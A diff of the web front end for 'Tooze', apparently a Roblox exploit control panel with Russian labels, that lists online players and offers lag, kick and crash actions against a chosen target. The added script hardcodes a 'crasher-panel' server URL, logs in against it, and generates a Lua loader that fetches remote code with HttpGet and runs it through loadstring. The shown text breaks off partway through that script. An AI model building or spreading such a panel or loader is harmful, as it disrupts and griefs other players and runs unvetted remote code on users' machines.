@@ -43,8 +43,6 @@
             min-height: 100vh;
             position: relative;
         }
-
-        /* ============ ANIMATED BACKGROUND ============ */
         .bg-fx { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
         .bg-orb { position: absolute; border-radius: 50%; filter: blur(80px); opacity: 0.45; mix-blend-mode: screen; }
         .bg-orb.orb-1 { width: 600px; height: 600px; background: radial-gradient(circle, #ec4899 0%, transparent 70%); top: -200px; left: -100px; animation: orbFloat1 18s ease-in-out infinite; }
@@ -56,231 +54,113 @@
         .bg-grid { position: fixed; inset: 0; background-image: radial-gradient(circle at 1px 1px, rgba(255,255,255,0.025) 1px, transparent 0); background-size: 32px 32px; pointer-events: none; z-index: 1; mask-image: radial-gradient(ellipse at center, black 50%, transparent 100%); }
         .bg-vignette { position: fixed; inset: 0; z-index: 1; pointer-events: none; background: radial-gradient(ellipse at top, transparent 0%, rgba(0,0,0,0.6) 100%); }
 
-        /* ============ SCROLLBAR ============ */
         ::-webkit-scrollbar { width: 6px; height: 6px; }
         ::-webkit-scrollbar-track { background: transparent; }
         ::-webkit-scrollbar-thumb { background: var(--line-2); border-radius: 8px; }
         ::-webkit-scrollbar-thumb:hover { background: var(--line-pink); }
 
-        /* ============ LOGIN SCREEN ============ */
         .login-screen { position: fixed; inset: 0; z-index: 100; display: flex; align-items: center; justify-content: center; padding: 20px; animation: loginFadeIn 0.6s cubic-bezier(0.22, 1, 0.36, 1); }
         .login-screen.fade-out { animation: loginFadeOut 0.5s cubic-bezier(0.22, 1, 0.36, 1) forwards; pointer-events: none; }
         @keyframes loginFadeIn { from { opacity: 0; transform: scale(1.04); } to { opacity: 1; transform: scale(1); } }
         @keyframes loginFadeOut { from { opacity: 1; transform: scale(1); } to { opacity: 0; transform: scale(0.96); } }
-        .login-card { width: 100%; max-width: 420px; background: linear-gradient(180deg, rgba(20, 20, 28, 0.85), rgba(10, 10, 14, 0.85)); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); border: 1px solid rgba(255,255,255,0.08); border-radius: 24px; padding: 36px 32px 28px; box-shadow: 0 30px 80px rgba(0,0,0,0.6), 0 0 80px rgba(236, 72, 153, 0.15), inset 0 1px 0 rgba(255,255,255,0.05); position: relative; overflow: hidden; animation: cardSlideUp 0.6s cubic-bezier(0.22, 1, 0.36, 1) 0.1s both; }
-        @keyframes cardSlideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
-        .login-card::before { content: ''; position: absolute; inset: 0; background: linear-gradient(135deg, transparent 0%, rgba(236, 72, 153, 0.08) 50%, transparent 100%); pointer-events: none; }
-        .login-card::after { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, transparent 20%, rgba(236, 72, 153, 0.5) 50%, transparent 80%); }
-        .login-logo { width: 78px; height: 78px; border-radius: 20px; margin: 0 auto 20px; overflow: hidden; position: relative; box-shadow: 0 0 0 1.5px var(--pink), 0 12px 36px var(--pink-glow), 0 4px 16px rgba(0,0,0,0.4); animation: logoPulse 3s ease-in-out infinite; }
-        .login-logo .fallback-logo { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: linear-gradient(135deg, var(--pink), var(--magenta)); font-size: 32px; font-weight: 900; color: white; }
-        @keyframes logoPulse { 0%, 100% { box-shadow: 0 0 0 1.5px var(--pink), 0 12px 36px var(--pink-glow), 0 4px 16px rgba(0,0,0,0.4); } 50% { box-shadow: 0 0 0 1.5px var(--pink-2), 0 16px 48px rgba(236, 72, 153, 0.6), 0 4px 16px rgba(0,0,0,0.4); } }
-        .login-title { font-size: 38px; font-weight: 800; letter-spacing: -1.5px; text-align: center; margin-bottom: 6px; background: linear-gradient(180deg, #ffffff 0%, #f5c8d8 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; line-height: 1; }
+        .login-card { width: 100%; max-width: 420px; background: linear-gradient(180deg, rgba(20, 20, 28, 0.85), rgba(10, 10, 14, 0.85)); backdrop-filter: blur(24px); -webkit-backdrop-filter: blur(24px); border: 1px solid rgba(255,255,255,0.08); border-radius: 24px; padding: 36px 32px 28px; box-shadow: 0 30px 80px rgba(0,0,0,0.6), 0 0 80px rgba(236, 72, 153, 0.15), inset 0 1px 0 rgba(255,255,255,0.05); position: relative; overflow: hidden; }
+        .login-logo { width: 78px; height: 78px; border-radius: 20px; margin: 0 auto 20px; overflow: hidden; position: relative; box-shadow: 0 0 0 1.5px var(--pink), 0 12px 36px var(--pink-glow); background: linear-gradient(135deg, var(--pink), var(--magenta)); display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: 900; color: white; }
+        .login-title { font-size: 38px; font-weight: 800; letter-spacing: -1.5px; text-align: center; margin-bottom: 6px; background: linear-gradient(180deg, #ffffff 0%, #f5c8d8 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
         .login-subtitle { text-align: center; color: var(--text-3); font-size: 13px; margin-bottom: 28px; font-weight: 500; }
-        .login-form { display: flex; flex-direction: column; gap: 12px; position: relative; z-index: 2; }
-        .login-input { width: 100%; padding: 15px 18px; background: rgba(0,0,0,0.4); border: 1px solid var(--line); border-radius: 14px; color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 14px; font-weight: 500; letter-spacing: 0.5px; outline: none; transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1); text-align: center; }
-        .login-input::placeholder { color: var(--text-4); letter-spacing: 1px; }
-        .login-input:focus { border-color: var(--pink); background: rgba(0,0,0,0.6); box-shadow: 0 0 0 4px var(--pink-soft), 0 0 24px rgba(236, 72, 153, 0.25); }
-        .login-btn { width: 100%; padding: 14px; background: linear-gradient(180deg, var(--pink-2) 0%, var(--pink) 100%); border: 1px solid var(--pink-2); border-radius: 14px; color: #fff; font-family: inherit; font-weight: 700; font-size: 14px; letter-spacing: 0.3px; cursor: pointer; transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1); box-shadow: 0 6px 20px -4px var(--pink-glow), inset 0 1px 0 rgba(255,255,255,0.2); position: relative; overflow: hidden; }
-        .login-btn:hover:not(:disabled) { transform: translateY(-2px); box-shadow: 0 10px 28px -4px var(--pink-glow), inset 0 1px 0 rgba(255,255,255,0.25); }
-        .login-footer { margin-top: 22px; padding-top: 18px; border-top: 1px solid var(--line); text-align: center; font-size: 11px; color: var(--text-4); font-family: 'JetBrains Mono', monospace; letter-spacing: 1px; text-transform: uppercase; }
-        .login-error-msg { color: var(--red); font-size: 12px; text-align: center; margin-top: -4px; min-height: 16px; font-weight: 500; opacity: 0; transition: opacity 0.2s; }
+        .login-form { display: flex; flex-direction: column; gap: 12px; }
+        .login-input { width: 100%; padding: 15px 18px; background: rgba(0,0,0,0.4); border: 1px solid var(--line); border-radius: 14px; color: var(--text); font-family: 'JetBrains Mono', monospace; font-size: 14px; outline: none; text-align: center; }
+        .login-input:focus { border-color: var(--pink); box-shadow: 0 0 0 4px var(--pink-soft); }
+        .login-btn { width: 100%; padding: 14px; background: linear-gradient(180deg, var(--pink-2) 0%, var(--pink) 100%); border: 1px solid var(--pink-2); border-radius: 14px; color: #fff; font-weight: 700; cursor: pointer; }
+        .login-error-msg { color: var(--red); font-size: 12px; text-align: center; min-height: 16px; margin-top: -4px; }
 
-        /* ============ MAIN PANEL ============ */
-        .main-panel { position: relative; z-index: 2; padding: 24px 20px; display: none; opacity: 0; animation: panelFadeIn 0.6s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
-        .main-panel.visible { display: flex; justify-content: center; }
-        @keyframes panelFadeIn { from { opacity: 0; transform: scale(0.98); } to { opacity: 1; transform: scale(1); } }
+        .main-panel { position: relative; z-index: 2; padding: 24px 20px; display: none; opacity: 0; }
+        .main-panel.visible { display: flex; justify-content: center; opacity: 1; }
         .app { max-width: 1400px; width: 100%; }
 
-        .header { display: flex; align-items: center; justify-content: space-between; padding: 14px 20px; background: linear-gradient(180deg, rgba(20, 20, 28, 0.7), rgba(10, 10, 14, 0.7)); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); margin-bottom: 22px; flex-wrap: wrap; gap: 12px; box-shadow: 0 20px 50px -20px rgba(0,0,0,0.5), inset 0 1px 0 rgba(255,255,255,0.04); position: relative; overflow: hidden; }
-        .header::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 1px; background: linear-gradient(90deg, transparent 20%, rgba(236, 72, 153, 0.4) 50%, transparent 80%); }
-        .header-left { display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
-        .logo-wrap { display: flex; align-items: center; gap: 12px; }
-        .logo-mark { width: 36px; height: 36px; border-radius: 11px; overflow: hidden; position: relative; box-shadow: 0 0 0 1.5px var(--pink), 0 8px 24px -4px var(--pink-glow); background: linear-gradient(135deg, var(--pink), var(--magenta)); display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 16px; }
-        .logo { font-size: 24px; font-weight: 800; letter-spacing: -0.7px; background: linear-gradient(180deg, #ffffff 0%, #f5c8d8 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
-        .logo-sub { font-size: 10px; font-weight: 700; color: var(--pink-3); background: var(--pink-soft); padding: 4px 10px; border-radius: 20px; border: 1px solid rgba(236, 72, 153, 0.25); letter-spacing: 0.8px; text-transform: uppercase; font-family: 'JetBrains Mono', monospace; }
-
-        /* КНОПКА ЛОАДЕРА */
-        .loader-btn { background: linear-gradient(180deg, rgba(236, 72, 153, 0.2) 0%, rgba(236, 72, 153, 0.05) 100%); border: 1px solid rgba(236, 72, 153, 0.4); color: var(--pink-3); padding: 8px 14px; font-size: 12px; font-weight: 700; border-radius: 11px; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: all 0.2s ease; box-shadow: 0 4px 12px rgba(236, 72, 153, 0.1); }
-        .loader-btn:hover { background: linear-gradient(180deg, rgba(236, 72, 153, 0.3) 0%, rgba(236, 72, 153, 0.1) 100%); border-color: var(--pink); box-shadow: 0 4px 16px var(--pink-glow); transform: translateY(-1px); }
-        .loader-btn svg { width: 14px; height: 14px; }
-
-        .header-actions { display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
-        .stat-pill { display: flex; align-items: center; gap: 8px; padding: 8px 14px; background: rgba(20, 20, 28, 0.6); border: 1px solid var(--line); border-radius: 11px; font-size: 12px; color: var(--text-2); font-weight: 500; backdrop-filter: blur(8px); }
-        .stat-pill .num { color: var(--text); font-weight: 700; font-size: 13px; font-variant-numeric: tabular-nums; }
-        .stat-pill .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 0 3px rgba(52, 211, 153, 0.18), 0 0 12px var(--green); animation: pulseDot 2s ease-in-out infinite; }
-        @keyframes pulseDot { 0%, 100% { box-shadow: 0 0 0 3px rgba(52, 211, 153, 0.18), 0 0 12px var(--green); } 50% { box-shadow: 0 0 0 6px rgba(52, 211, 153, 0.08), 0 0 8px var(--green); } }
-        .stat-pill svg { width: 12px; height: 12px; color: var(--pink-3); }
-        .logout-btn { padding: 8px 12px; background: rgba(248, 113, 113, 0.08); border: 1px solid rgba(248, 113, 113, 0.2); border-radius: 11px; color: var(--red); font-family: inherit; font-weight: 600; font-size: 12px; cursor: pointer; transition: all 0.2s; display: flex; align-items: center; gap: 6px; }
-        .logout-btn:hover { background: rgba(248, 113, 113, 0.18); border-color: rgba(248, 113, 113, 0.4); }
+        .header { display: flex; align-items: center; justify-content: space-between; padding: 14px 20px; background: rgba(20, 20, 28, 0.7); backdrop-filter: blur(20px); border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); margin-bottom: 22px; }
+        .header-left { display: flex; align-items: center; gap: 14px; }
+        .logo { font-size: 24px; font-weight: 800; }
+        .loader-btn { background: rgba(236, 72, 153, 0.1); border: 1px solid var(--pink); color: var(--pink-3); padding: 8px 14px; font-size: 12px; font-weight: 700; border-radius: 11px; cursor: pointer; display: flex; align-items: center; gap: 8px; }
+        .stat-pill { display: flex; align-items: center; gap: 8px; padding: 8px 14px; background: rgba(20, 20, 28, 0.6); border: 1px solid var(--line); border-radius: 11px; font-size: 12px; }
+        .stat-pill .dot { width: 7px; height: 7px; border-radius: 50%; background: var(--green); box-shadow: 0 0 8px var(--green); }
 
         .main { display: grid; grid-template-columns: 1fr 380px; gap: 22px; }
         @media (max-width: 900px) { .main { grid-template-columns: 1fr; } }
 
-        /* ============ PLAYERS SECTION ============ */
-        .players-section { background: linear-gradient(180deg, rgba(20, 20, 28, 0.6), rgba(10, 10, 14, 0.6)); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); padding: 22px; min-height: 440px; box-shadow: inset 0 1px 0 rgba(255,255,255,0.04); }
-        .section-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; flex-wrap: wrap; gap: 10px; }
-        .section-title { font-size: 16px; font-weight: 700; letter-spacing: -0.3px; display: flex; align-items: center; gap: 10px; }
-        .sec-icon { width: 30px; height: 30px; border-radius: 9px; background: var(--pink-soft); display: inline-flex; align-items: center; justify-content: center; border: 1px solid rgba(236, 72, 153, 0.2); color: var(--pink-3); }
-        .sec-icon svg { width: 14px; height: 14px; }
-        .badge-pill { background: rgba(0,0,0,0.4); padding: 4px 12px; border-radius: 30px; font-size: 12px; color: var(--text-2); font-weight: 600; border: 1px solid var(--line); }
-
-        .search-bar { width: 100%; margin-bottom: 16px; position: relative; }
-        .search-bar svg { position: absolute; left: 14px; top: 50%; transform: translateY(-50%); width: 14px; height: 14px; color: var(--text-4); pointer-events: none; }
-        .search-bar input { width: 100%; padding: 12px 14px 12px 40px; background: rgba(0,0,0,0.4); border: 1px solid var(--line); border-radius: 12px; color: var(--text); font-family: inherit; font-size: 13px; font-weight: 500; outline: none; transition: all 0.2s; }
-        .search-bar input:focus { border-color: var(--pink); background: rgba(0,0,0,0.5); box-shadow: 0 0 0 3px var(--pink-soft); }
+        .players-section { background: rgba(20, 20, 28, 0.6); backdrop-filter: blur(20px); border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); padding: 22px; min-height: 440px; }
+        .search-bar { width: 100%; margin-bottom: 16px; }
+        .search-bar input { width: 100%; padding: 12px; background: rgba(0,0,0,0.4); border: 1px solid var(--line); border-radius: 12px; color: var(--text); outline: none; }
 
         .player-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(210px, 1fr)); gap: 10px; }
-        .player-card { background: linear-gradient(180deg, rgba(28, 28, 36, 0.7), rgba(20, 20, 28, 0.7)); backdrop-filter: blur(8px); border-radius: 13px; padding: 14px; border: 1px solid rgba(255,255,255,0.06); cursor: pointer; transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1); display: flex; align-items: center; gap: 12px; position: relative; overflow: hidden; }
-        .player-card.selected { border-color: var(--pink); background: linear-gradient(180deg, rgba(236, 72, 153, 0.12), rgba(20, 20, 28, 0.7)); box-shadow: 0 0 0 1px var(--pink), 0 12px 28px -8px var(--pink-glow); }
+        .player-card { background: rgba(28, 28, 36, 0.7); border-radius: 13px; padding: 14px; border: 1px solid rgba(255,255,255,0.06); cursor: pointer; display: flex; align-items: center; gap: 12px; }
+        .player-card.selected { border-color: var(--pink); background: rgba(236, 72, 153, 0.05); }
+        .player-avatar { width: 42px; height: 42px; border-radius: 12px; background: #000; display: flex; align-items: center; justify-content: center; font-weight: 800; color: var(--pink-3); border: 1px solid var(--line-2); }
+        .player-name { font-weight: 700; font-size: 13px; }
 
-        .player-avatar { width: 42px; height: 42px; border-radius: 12px; background: var(--bg); flex-shrink: 0; overflow: hidden; border: 1px solid var(--line-2); display: flex; align-items: center; justify-content: center; }
-        .player-avatar .fallback { font-size: 16px; font-weight: 800; color: var(--pink-3); }
-        .player-info { flex: 1; min-width: 0; }
-        .player-name { font-weight: 700; font-size: 13px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; color: var(--text); margin-bottom: 4px; }
-        .player-meta { font-size: 10px; color: var(--text-3); display: flex; gap: 5px; flex-wrap: wrap; }
-        .player-meta .tag { background: rgba(0,0,0,0.4); padding: 1.5px 7px; border-radius: 5px; font-size: 9.5px; color: var(--text-2); border: 1px solid var(--line); }
-        .player-status { width: 9px; height: 9px; border-radius: 50%; background: var(--green); box-shadow: 0 0 0 3px rgba(52, 211, 153, 0.2), 0 0 8px var(--green); }
-
-        .empty-state { grid-column: 1 / -1; text-align: center; padding: 70px 20px; color: var(--text-3); }
-        .empty-state .empty-icon { display: inline-flex; align-items: center; justify-content: center; width: 64px; height: 64px; border-radius: 16px; background: var(--pink-soft); border: 1px solid rgba(236, 72, 153, 0.15); margin-bottom: 18px; color: var(--pink-3); animation: float 3.5s ease-in-out infinite; }
-        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-8px); } }
-        .empty-state p { font-size: 14px; font-weight: 600; color: var(--text-2); }
-        .empty-state .sub { font-size: 12px; color: var(--text-4); margin-top: 6px; }
-
-        /* ============ COMMAND PANEL ============ */
-        .command-panel { background: linear-gradient(180deg, rgba(20, 20, 28, 0.6), rgba(10, 10, 14, 0.6)); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); padding: 22px; align-self: start; position: sticky; top: 20px; box-shadow: inset 0 1px 0 rgba(255,255,255,0.04); }
-        .panel-header { display: flex; align-items: center; gap: 10px; margin-bottom: 4px; }
-        .panel-title { font-size: 15px; font-weight: 700; display: flex; align-items: center; gap: 8px; flex: 1; }
-        .panel-title .target-name { color: var(--pink-3); font-weight: 700; }
-        .panel-sub { font-size: 12px; color: var(--text-3); margin: 6px 0 20px; padding-bottom: 18px; border-bottom: 1px solid var(--line); font-weight: 500; display: flex; align-items: center; gap: 6px; }
-        .panel-sub .status-indicator { width: 6px; height: 6px; border-radius: 50%; background: var(--text-4); }
-        .panel-sub.online .status-indicator { background: var(--green); box-shadow: 0 0 0 2px rgba(52, 211, 153, 0.2), 0 0 6px var(--green); }
-
+        .command-panel { background: rgba(20, 20, 28, 0.6); backdrop-filter: blur(20px); border-radius: 18px; border: 1px solid rgba(255,255,255,0.06); padding: 22px; }
+        .panel-title { font-size: 15px; font-weight: 700; margin-bottom: 15px; }
         .cmd-group { margin-bottom: 18px; }
-        .cmd-label { font-size: 10px; font-weight: 700; color: var(--text-3); display: block; margin-bottom: 10px; letter-spacing: 1.5px; text-transform: uppercase; }
-        .cmd-row { display: flex; gap: 8px; flex-wrap: wrap; }
+        .cmd-label { font-size: 10px; font-weight: 700; color: var(--text-3); text-transform: uppercase; margin-bottom: 8px; display: block; }
+        
+        .toggle-wrap { display: flex; align-items: center; justify-content: space-between; background: rgba(0,0,0,0.3); padding: 10px; border-radius: 12px; border: 1px solid var(--line); cursor: pointer; }
+        .toggle-wrap.active { border-color: var(--pink); color: var(--pink-3); }
+        
+        .cmd-btn-group { display: flex; gap: 8px; }
+        .cmd-btn { padding: 10px; border-radius: 12px; border: 1px solid var(--line); font-weight: 700; cursor: pointer; flex: 1; background: rgba(0,0,0,0.3); color: #fff; }
+        .cmd-btn.danger { color: var(--red); border-color: rgba(248, 113, 113, 0.3); }
+        .cmd-btn.warning { color: var(--amber); border-color: rgba(251, 191, 36, 0.3); }
 
-        .toggle-wrap { display: flex; align-items: center; gap: 10px; background: rgba(0,0,0,0.3); padding: 10px 13px 10px 15px; border-radius: 12px; border: 1px solid var(--line); cursor: pointer; transition: all 0.25s; user-select: none; flex: 1; min-width: 95px; justify-content: space-between; }
-        .toggle-wrap .label { font-size: 12px; color: var(--text); font-weight: 600; }
-        .toggle-right { display: flex; align-items: center; gap: 8px; }
-        .toggle-track { width: 34px; height: 20px; background: rgba(0,0,0,0.6); border-radius: 30px; position: relative; transition: all 0.3s; border: 1px solid var(--line-2); }
-        .toggle-track .thumb { width: 14px; height: 14px; background: var(--text-4); border-radius: 50%; position: absolute; top: 2px; left: 2px; transition: all 0.3s; }
-        .toggle-wrap.active { border-color: var(--pink); background: linear-gradient(180deg, rgba(236, 72, 153, 0.12), rgba(0,0,0,0.3)); }
-        .toggle-wrap.active .toggle-track { background: var(--pink); border-color: var(--pink-2); box-shadow: 0 0 14px var(--pink-glow); }
-        .toggle-wrap.active .toggle-track .thumb { left: 17px; background: #fff; }
-        .toggle-wrap .status-text { font-size: 10px; color: var(--text-4); font-weight: 700; font-family: 'JetBrains Mono', monospace; }
-        .toggle-wrap.active .status-text { color: var(--pink-3); }
-
-        .cmd-btn { padding: 10px 14px; border-radius: 12px; border: 1px solid var(--line); font-weight: 700; font-size: 12px; cursor: pointer; transition: all 0.2s; background: rgba(0,0,0,0.3); color: var(--text); flex: 1; min-width: 80px; display: inline-flex; align-items: center; justify-content: center; gap: 6px; }
-        .cmd-btn svg { width: 13px; height: 13px; }
-        .cmd-btn.danger { background: linear-gradient(180deg, rgba(248, 113, 113, 0.12), rgba(0,0,0,0.3)); border-color: rgba(248, 113, 113, 0.3); color: var(--red); }
-        .cmd-btn.warning { background: linear-gradient(180deg, rgba(251, 191, 36, 0.12), rgba(0,0,0,0.3)); border-color: rgba(251, 191, 36, 0.3); color: var(--amber); }
-        .cmd-btn-group { display: flex; gap: 8px; flex-wrap: wrap; width: 100%; }
-
-        /* ============ BRAINROTS ============ */
-        .brainrot-section { margin-top: 20px; padding-top: 18px; border-top: 1px solid var(--line); }
-        .brainrot-label { font-size: 10px; text-transform: uppercase; letter-spacing: 1.5px; color: var(--text-3); margin-bottom: 12px; display: flex; justify-content: space-between; align-items: center; font-weight: 700; }
-        .brainrot-label .count { color: var(--pink-3); font-size: 10px; background: var(--pink-soft); padding: 3px 10px; border-radius: 12px; border: 1px solid rgba(236, 72, 153, 0.25); font-family: 'JetBrains Mono', monospace; }
-        .brainrot-list { display: flex; flex-direction: column; gap: 5px; max-height: 180px; overflow-y: auto; }
-        .brainrot-item { display: flex; justify-content: space-between; align-items: center; padding: 9px 12px; background: rgba(0,0,0,0.35); border-radius: 10px; font-size: 12px; border: 1px solid var(--line); border-left: 2px solid var(--pink); }
-        .brainrot-item .title { color: var(--text); font-weight: 500; }
-        .brainrot-item .cash { color: var(--pink-3); font-weight: 700; font-family: 'JetBrains Mono', monospace; }
-        .brainrot-empty { color: var(--text-4); font-size: 12px; padding: 18px 0; text-align: center; font-style: italic; }
-
-        /* ============ TOAST ============ */
-        .toast { position: fixed; bottom: 28px; left: 50%; transform: translateX(-50%) translateY(80px); background: linear-gradient(180deg, rgba(28, 28, 36, 0.95), rgba(20, 20, 28, 0.95)); backdrop-filter: blur(12px); border: 1px solid var(--line-pink); padding: 12px 22px; border-radius: 14px; font-size: 13px; font-weight: 600; color: var(--text); opacity: 0; transition: all 0.4s cubic-bezier(0.22, 1, 0.36, 1); pointer-events: none; z-index: 999; box-shadow: 0 14px 40px rgba(0,0,0,0.6), 0 0 28px var(--pink-glow); }
+        .toast { position: fixed; bottom: 28px; left: 50%; transform: translateX(-50%) translateY(80px); background: #1c1c24; border: 1px solid var(--pink); padding: 12px 22px; border-radius: 14px; font-size: 13px; opacity: 0; transition: all 0.3s; z-index: 999; }
         .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
     </style>
 </head>
 <body>
 
-<div class="bg-fx"><div class="bg-orb orb-1"></div><div class="bg-orb orb-2"></div><div class="bg-orb orb-3"></div></div>
-<div class="bg-grid"></div><div class="bg-vignette"></div>
+<div class="bg-fx"><div class="bg-orb orb-1"></div><div class="bg-orb orb-2"></div></div>
+<div class="bg-grid"></div>
 
-<!-- ============ LOGIN SCREEN ============ -->
 <div class="login-screen" id="loginScreen">
     <div class="login-card">
-        <div class="login-logo"><div class="fallback-logo">T</div></div>
+        <div class="login-logo">T</div>
         <h1 class="login-title">Tooze</h1>
-        <p class="login-subtitle">Enter password to continue</p>
+        <p class="login-subtitle">Введите пароль панели</p>
         <form class="login-form" id="loginForm" onsubmit="return false;">
             <input type="password" class="login-input" id="keyInput" placeholder="Password" autocomplete="off" autofocus />
             <div class="login-error-msg" id="loginErrorMsg"></div>
-            <button type="submit" class="login-btn" id="loginBtn">Enter</button>
+            <button type="submit" class="login-btn">Войти</button>
         </form>
-        <div class="login-footer">Tooze · v5</div>
     </div>
 </div>
 
-<!-- ============ MAIN PANEL ============ -->
 <div class="main-panel" id="mainPanel">
     <div class="app">
         <header class="header">
             <div class="header-left">
-                <div class="logo-wrap"><div class="logo-mark">T</div><span class="logo">Tooze</span></div>
-                <span class="logo-sub">v5 · live</span>
-                <button class="loader-btn" id="getLoaderBtn">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M16 18l6-6-6-6M8 6l-6 6 6 6"/></svg>
-                    Get Loader Script
-                </button>
+                <span class="logo">Tooze v5</span>
+                <button class="loader-btn" id="getLoaderBtn">Get Loader Script</button>
             </div>
-            <div class="header-actions">
-                <div class="stat-pill"><span class="dot"></span><span class="num" id="onlineCount">1</span> online</div>
-                <button class="logout-btn" id="logoutBtn">Logout</button>
-            </div>
+            <div class="stat-pill"><span class="dot"></span><span id="onlineCount">0</span> игроков</div>
         </header>
 
         <div class="main">
             <section class="players-section">
-                <div class="section-header">
-                    <h2 class="section-title">Players <span class="badge-pill" id="totalBadge">1</span></h2>
-                    <span class="last-update" id="lastUpdate">Just now</span>
-                </div>
-                <div class="search-bar">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
-                    <input type="text" id="searchInput" placeholder="Search by username..." />
-                </div>
-                <div class="player-grid" id="playerGrid">
-                    <div class="player-card selected" onclick="selectDemoPlayer()">
-                        <div class="player-avatar"><div class="fallback">J</div></div>
-                        <div class="player-info"><div class="player-name">Jaxx25500</div><div class="player-meta"><span class="tag">Wave</span><span class="tag">Blox Fruits</span></div></div>
-                        <div class="player-status"></div>
-                    </div>
-                </div>
+                <div class="search-bar"><input type="text" id="searchInput" placeholder="Поиск игрока..." /></div>
+                <div class="player-grid" id="playerGrid"></div>
             </section>
 
             <aside class="command-panel">
-                <div class="panel-header"><div class="panel-title">Control · <span class="target-name" id="targetName">Jaxx25500</span></div></div>
-                <div class="panel-sub online" id="panelSub"><span class="status-indicator"></span><span id="targetStatus">Online · Wave</span></div>
-
-                <div class="cmd-group">
-                    <span class="cmd-label">Performance</span>
-                    <div class="cmd-row">
-                        <div class="toggle-wrap" id="toggleFps"><span class="label">FPS Limit</span><div class="toggle-right"><div class="toggle-track"><span class="thumb"></span></div><span class="status-text">OFF</span></div></div>
-                    </div>
-                </div>
-
+                <div class="panel-title">Управление: <span id="targetName" style="color:var(--pink);">Никто не выбран</span></div>
+                
                 <div class="cmd-group">
                     <span class="cmd-label">Lag Engine</span>
-                    <div class="cmd-row">
-                        <div class="toggle-wrap" id="toggleLagN"><span class="label">Normal</span><div class="toggle-right"><div class="toggle-track"><span class="thumb"></span></div><span class="status-text">OFF</span></div></div>
-                        <div class="toggle-wrap" id="toggleLagC"><span class="label">Carry</span><div class="toggle-right"><div class="toggle-track"><span class="thumb"></span></div><span class="status-text">OFF</span></div></div>
-                    </div>
+                    <div class="toggle-wrap" id="toggleLag"><span class="label">Залагать игрока</span><span class="status-text">OFF</span></div>
                 </div>
 
                 <div class="cmd-group">
-                    <span class="cmd-label">Actions</span>
+                    <span class="cmd-label">Действия</span>
                     <div class="cmd-btn-group">
                         <button class="cmd-btn danger" id="btnKick">Kick</button>
                         <button class="cmd-btn warning" id="btnCrash">Crash</button>
-                    </div>
-                </div>
-
-                <div class="brainrot-section">
-                    <div class="brainrot-label">Brainrots <span class="count" id="brainrotCount">2 items</span></div>
-                    <div class="brainrot-list" id="brainrotList">
-                        <div class="brainrot-item"><span class="title">Beli Cash</span><span class="cash">$1,250,000</span></div>
-                        <div class="brainrot-item"><span class="title">Current Level</span><span class="cash">Lv. 2450</span></div>
                     </div>
                 </div>
             </aside>
@@ -291,22 +171,96 @@
 <div class="toast" id="toast"></div>
 
 <script>
-    const $ = (s) => document.querySelector(s);
-    
-    // Логика кнопки лоадера
-    $('#getLoaderBtn').addEventListener('click', () => {
-        const currentUrl = window.location.href;
-        const luaScript = `-- Tooze Exploit Loader
-local WebPanel = "${currentUrl}"
-print("Successfully hooked to panel: " .. WebPanel)
-game:GetService("Components"):PresetLoader(WebPanel) -- Запуск фейк-клиента`;
+    // Твоя ссылка на Render зашита намертво здесь:
+    const SERVER_URL = "https://crasher-panel.onrender.com"; 
+    let currentTarget = null;
+    let authToken = "";
 
-        navigator.clipboard.writeText(luaScript).then(() => {
-            showToast('Loader script copied to clipboard!');
-        }).catch(() => {
-            showToast('Failed to copy code.');
-        });
+    const $ = (s) => document.querySelector(s);
+
+    $('#loginForm').addEventListener('submit', async () => {
+        const password = $('#keyInput').value;
+        try {
+            const res = await fetch(`${SERVER_URL}/api/login`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password })
+            });
+            const data = await res.json();
+            if(data.success) {
+                authToken = password;
+                $('#loginScreen').classList.add('fade-out');
+                setTimeout(() => {
+                    $('#loginScreen').style.display = 'none';
+                    $('#mainPanel').classList.add('visible');
+                    startPolling();
+                }, 500);
+            } else {
+                $('#loginErrorMsg').textContent = "Неверный пароль";
+            }
+        } catch(e) {
+            $('#loginErrorMsg').textContent = "Ошибка подключения к серверу";
+        }
     });
+
+    $('#getLoaderBtn').addEventListener('click', () => {
+        const luaScript = `-- Tooze Exploit Loader
+local serverUrl = "${SERVER_URL}"
+_G.ToozeServer = serverUrl
+loadstring(game:HttpGet(serverUrl .. "/api/get_exec_script"))()`;
